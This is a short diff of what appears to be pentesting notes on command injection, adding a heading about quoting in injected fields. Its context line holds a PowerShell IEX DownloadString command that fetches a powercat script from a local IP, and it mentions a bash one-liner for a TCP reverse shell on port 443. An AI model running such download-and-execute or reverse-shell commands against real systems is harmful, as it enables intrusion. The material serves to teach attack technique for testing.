@@ -44,3 +44,8 @@ EX (New-Object System.Net.Webclient).DownloadString("http://192.168.1.1/powercat
 using linux our attack might look like the following, where we use the bash one liner to create a tcp shell to our machine on 443
 
 ![_config.yml]({{ site.baseurl }}/images/web/bash_cmd_injection.png)
+
+<h3>PAY ATTENTION TO QUOTES</h3>
+
+with cmd injection in fields, if running some kind of language processing on the os like python etc 
+
